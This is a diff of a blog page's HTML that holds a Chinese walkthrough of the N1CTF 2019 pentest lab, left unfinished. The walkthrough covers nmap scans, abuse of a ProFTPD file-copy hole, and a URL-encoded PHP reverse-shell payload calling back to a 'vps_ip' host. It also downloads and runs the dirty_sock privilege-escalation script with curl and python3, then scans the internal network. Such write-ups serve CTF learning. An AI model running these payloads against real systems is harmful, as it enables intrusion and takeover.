@@ -205,30 +205,30 @@
 
         </div>
         <div class="post-content" id="post-content" itemprop="postContent">
-            <h2 id="Pentest-N1ctf2019-lab-step1"><a href="#Pentest-N1ctf2019-lab-step1" class="headerlink" title="Pentest N1ctf2019.lab(step1)"></a>Pentest N1ctf2019.lab(step1)</h2><p>链接：<a href="http://47.52.129.242/" target="_blank" rel="noopener">http://47.52.129.242/</a><br>web页面啥也没有，用nmap扫一波<br></p><figure class="highlight sh"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sS -P0 -T4 47.52.129.242 -vv</span><br></pre></td></tr></tbody></table></figure><p></p>
-<p>扫描结果<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">PORT   STATE SERVICE REASON</span><br><span class="line">21/tcp open  ftp     syn-ack ttl 128</span><br><span class="line">22/tcp open  ssh     syn-ack ttl 128</span><br><span class="line">80/tcp open  http    syn-ack ttl 128</span><br></pre></td></tr></tbody></table></figure><p></p>
+            <h2 id="Pentest-N1ctf2019-lab-step1"><a href="#Pentest-N1ctf2019-lab-step1" class="headerlink" title="Pentest N1ctf2019.lab(step1)"></a>Pentest N1ctf2019.lab(step1)</h2><p>链接：<a href="http://47.52.129.242/" target="_blank" rel="noopener">http://47.52.129.242/</a><br>web页面啥也没有，用nmap扫一波<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sS -P0 -T4 47.52.129.242 -vv</span><br></pre></td></tr></table></figure></p>
+<p>扫描结果<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">PORT   STATE SERVICE REASON</span><br><span class="line">21/tcp open  ftp     syn-ack ttl 128</span><br><span class="line">22/tcp open  ssh     syn-ack ttl 128</span><br><span class="line">80/tcp open  http    syn-ack ttl 128</span><br></pre></td></tr></table></figure></p>
 <p>发现开放了<code>22</code>，<code>21</code>，<code>80</code>端口，猜测入口点应该是在<code>ftp</code>服务，发现可以匿名登陆</p>
 <figure class="image-bubble">
                 <div class="img-lightbox">
                     <div class="overlay"></div>
-                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190908105616-3993ed62-d1e4-1.png" alt="image.png" title="">
+                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190908105616-3993ed62-d1e4-1.png" alt="image.png" title>
                 </div>
                 <div class="image-caption">image.png</div>
             </figure>
-<p>用<code>nmap</code>扫描一下版本<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -P0 -p 21 47.52.129.242 -vv</span><br></pre></td></tr></tbody></table></figure><p></p>
-<p>扫描结果如下<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PORT   STATE SERVICE REASON          VERSION</span><br><span class="line">21/tcp open  ftp     syn-ack ttl 128 ProFTPD 1.3.5rc3</span><br><span class="line">Service Info: OS: Unix</span><br></pre></td></tr></tbody></table></figure><p></p>
-<p>用msf找一下有没有<code>ProFTPD</code>这个版本的洞，发现有一个文件复制漏洞<br></p><figure class="image-bubble">
+<p>用<code>nmap</code>扫描一下版本<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -P0 -p 21 47.52.129.242 -vv</span><br></pre></td></tr></table></figure></p>
+<p>扫描结果如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PORT   STATE SERVICE REASON          VERSION</span><br><span class="line">21/tcp open  ftp     syn-ack ttl 128 ProFTPD 1.3.5rc3</span><br><span class="line">Service Info: OS: Unix</span><br></pre></td></tr></table></figure></p>
+<p>用msf找一下有没有<code>ProFTPD</code>这个版本的洞，发现有一个文件复制漏洞<br><figure class="image-bubble">
                 <div class="img-lightbox">
                     <div class="overlay"></div>
-                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190908110708-be5654a8-d1e5-1.png" alt="image.png" title="">
+                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190908110708-be5654a8-d1e5-1.png" alt="image.png" title>
                 </div>
                 <div class="image-caption">image.png</div>
-            </figure><p></p>
+            </figure></p>
 <p>尝试一波，发现可以写入</p>
 <figure class="image-bubble">
                 <div class="img-lightbox">
                     <div class="overlay"></div>
-                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190908111907-6b556a8a-d1e7-1.png" alt="image.png" title="">
+                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190908111907-6b556a8a-d1e7-1.png" alt="image.png" title>
                 </div>
                 <div class="image-caption">image.png</div>
             </figure>
@@ -236,25 +236,25 @@
 <figure class="image-bubble">
                 <div class="img-lightbox">
                     <div class="overlay"></div>
-                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190908112355-16d4c040-d1e8-1.png" alt="image.png" title="">
+                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190908112355-16d4c040-d1e8-1.png" alt="image.png" title>
                 </div>
                 <div class="image-caption">image.png</div>
             </figure>
-<p>为了方便操作，我们弹个shell回来<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/qiyou.php?enjoy~=$sock+%3d+fsockopen("vps_ip",+6666)%3b$descriptorspec+%3d+array(0+%3d&gt;+$sock,1+%3d&gt;+$sock,2+%3d&gt;+$sock)%3b$process+%3d+proc_open('/bin/sh',+$descriptorspec,+$pipes)%3bproc_close($process)%3b</span><br></pre></td></tr></tbody></table></figure><p></p>
+<p>为了方便操作，我们弹个shell回来<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/qiyou.php?enjoy~=$sock+%3d+fsockopen(&quot;vps_ip&quot;,+6666)%3b$descriptorspec+%3d+array(0+%3d&gt;+$sock,1+%3d&gt;+$sock,2+%3d&gt;+$sock)%3b$process+%3d+proc_open(&apos;/bin/sh&apos;,+$descriptorspec,+$pipes)%3bproc_close($process)%3b</span><br></pre></td></tr></table></figure></p>
 <p>根据题目提示，flag在<code>/root/flag.txt</code>里面，但是发现没有权限</p>
 <figure class="image-bubble">
                 <div class="img-lightbox">
                     <div class="overlay"></div>
-                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190908112800-a8789b2a-d1e8-1.png" alt="image.png" title="">
+                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190908112800-a8789b2a-d1e8-1.png" alt="image.png" title>
                 </div>
                 <div class="image-caption">image.png</div>
             </figure>
-<p>根据题目提示<code>snap</code>，猜测可能是要用<code>snap</code>提权，google一下这个版本的<code>snap</code>发现可以提权，直接用github上的脚本提权：<a href="https://github.com/initstring/dirty_sock/blob/master/dirty_sockv2.py" target="_blank" rel="noopener">链接</a><br>然后执行一波<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -O https://raw.githubusercontent.com/initstring/dirty_sock/master/dirty_sockv2.py &amp;&amp; python3 dirty_sockv2.py</span><br></pre></td></tr></tbody></table></figure><p></p>
+<p>根据题目提示<code>snap</code>，猜测可能是要用<code>snap</code>提权，google一下这个版本的<code>snap</code>发现可以提权，直接用github上的脚本提权：<a href="https://github.com/initstring/dirty_sock/blob/master/dirty_sockv2.py" target="_blank" rel="noopener">链接</a><br>然后执行一波<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -O https://raw.githubusercontent.com/initstring/dirty_sock/master/dirty_sockv2.py &amp;&amp; python3 dirty_sockv2.py</span><br></pre></td></tr></table></figure></p>
 <p>执行成功后会创建一个<code>dirty_sock</code>用户，密码也为<code>dirty_sock</code>。然后我们ssh连上去（php反弹shell的不能直接用su）就可以提权了</p>
 <figure class="image-bubble">
                 <div class="img-lightbox">
                     <div class="overlay"></div>
-                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190908153206-c27b1bfc-d20a-1.png" alt="image.png" title="">
+                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190908153206-c27b1bfc-d20a-1.png" alt="image.png" title>
                 </div>
                 <div class="image-caption">image.png</div>
             </figure>
@@ -262,49 +262,31 @@
 <figure class="image-bubble">
                 <div class="img-lightbox">
                     <div class="overlay"></div>
-                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190908153322-ef9cec78-d20a-1.png" alt="image.png" title="">
+                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190908153322-ef9cec78-d20a-1.png" alt="image.png" title>
                 </div>
                 <div class="image-caption">image.png</div>
             </figure>
-<h2 id="Pentest-N1ctf2019-lab-step2"><a href="#Pentest-N1ctf2019-lab-step2" class="headerlink" title="Pentest N1ctf2019.lab(step2)"></a>Pentest N1ctf2019.lab(step2)</h2><p>第一步渗透完了，猜测第二个flag应该是在内网的其它机器上面，我们用nmap扫描一下C段<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p 80 -sS -T4 10.0.0.85/24</span><br></pre></td></tr></tbody></table></figure><p></p>
+<h2 id="Pentest-N1ctf2019-lab-step2"><a href="#Pentest-N1ctf2019-lab-step2" class="headerlink" title="Pentest N1ctf2019.lab(step2)"></a>Pentest N1ctf2019.lab(step2)</h2><p>第一步渗透完了，猜测第二个flag应该是在内网的其它机器上面，我们用nmap扫描一下C段<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p 80 -sS -T4 10.0.0.85/24</span><br></pre></td></tr></table></figure></p>
 <p>发现内网的一个<code>10.0.0.88</code>开放80端口</p>
 <figure class="image-bubble">
                 <div class="img-lightbox">
                     <div class="overlay"></div>
-                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190908160618-89bf4752-d20f-1.png" alt="image.png" title="">
+                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190908160618-89bf4752-d20f-1.png" alt="image.png" title>
                 </div>
                 <div class="image-caption">image.png</div>
             </figure>
 <p>为了方便操作，我们用<code>lcx</code>把内网的<code>10.0.0.88</code>的80端口转发出来</p>
 <p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190908165332-22a1c138-d216-1.png" alt="image.png"></p>
-<p>查看源码发现有任意文件读取<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">readfile.php?path=img/kerberos.jpg</span><br></pre></td></tr></tbody></table></figure><p></p>
+<p>查看源码发现有任意文件读取<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">readfile.php?path=img/kerberos.jpg</span><br></pre></td></tr></table></figure></p>
 <figure class="image-bubble">
                 <div class="img-lightbox">
                     <div class="overlay"></div>
-                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190908164857-7eaeff82-d215-1.png" alt="image.png" title="">
+                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190908164857-7eaeff82-d215-1.png" alt="image.png" title>
                 </div>
                 <div class="image-caption">image.png</div>
             </figure>
 <p>未完，带补充</p>
-<script>
-        document.querySelectorAll('.github-emoji')
-          .forEach(el => {
-            if (!el.dataset.src) { return; }
-            const img = document.createElement('img');
-            img.style = 'display:none !important;';
-            img.src = el.dataset.src;
-            img.addEventListener('error', () => {
-              img.remove();
-              el.style.color = 'inherit';
-              el.style.backgroundImage = 'none';
-              el.style.background = 'none';
-            });
-            img.addEventListener('load', () => {
-              img.remove();
-            });
-            document.body.appendChild(img);
-          });
-      </script>
+
         </div>
 
         <blockquote class="post-copyright">
